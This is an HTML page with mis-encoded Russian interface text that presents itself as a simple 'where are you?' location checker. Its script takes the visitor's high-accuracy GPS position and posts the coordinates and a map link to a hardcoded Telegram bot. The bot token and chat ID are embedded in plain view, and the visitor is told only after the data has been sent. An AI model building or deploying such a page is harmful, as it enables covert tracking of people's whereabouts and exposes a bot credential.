<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è</title>
</head>
<body>
  <h2>üåç –ì–¥–µ —Ç—ã –Ω–∞—Ö–æ–¥–∏—à—å—Å—è?</h2>
  <p id="output">–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ</p>
  <button onclick="getLocation()">üìç –û–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã</button>

  <script>
    const botToken = "7903305941:AAF_7buaRxszZuLBo-WOEZ2spgM4bVhj1TY"; // –¢–æ–∫–µ–Ω –±–æ—Ç–∞
    const chatId = "5783656146"; // –¢–≤–æ–π Telegram ID

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
          enableHighAccuracy: true, // –î–ª—è –±–æ–ª–µ–µ —Ç–æ—á–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
          timeout: 10000, // –¢–∞–π–º–∞—É—Ç –∑–∞–ø—Ä–æ—Å–∞
          maximumAge: 0 // –ù–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫—ç—à–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        });
      } else {
        document.getElementById("output").textContent = "–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é.";
      }
    }

    function sendToTelegram(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
      const msg = `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n\n–®–∏—Ä–æ—Ç–∞: ${lat}\n–î–æ–ª–≥–æ—Ç–∞: ${lon}\n–¢–æ—á–Ω–æ—Å—Ç—å: ¬±${Math.round(accuracy)} –º\n\nüåê –ö–∞—Ä—Ç–∞: ${mapsUrl}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg
        })
      });

      document.getElementById("output").textContent = "‚úÖ –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã + –∫–∞—Ä—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram!";
    }

    function showError(error) {
      let msg = "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏.";
      if (error.code === 1) msg = "–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â—ë–Ω.";
      if (error.code === 2) msg = "–ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ.";
      if (error.code === 3) msg = "–ü—Ä–µ–≤—ã—à–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è.";

      document.getElementById("output").textContent = "‚ö†Ô∏è " + msg;
    }
  </script>
</body>
</html>
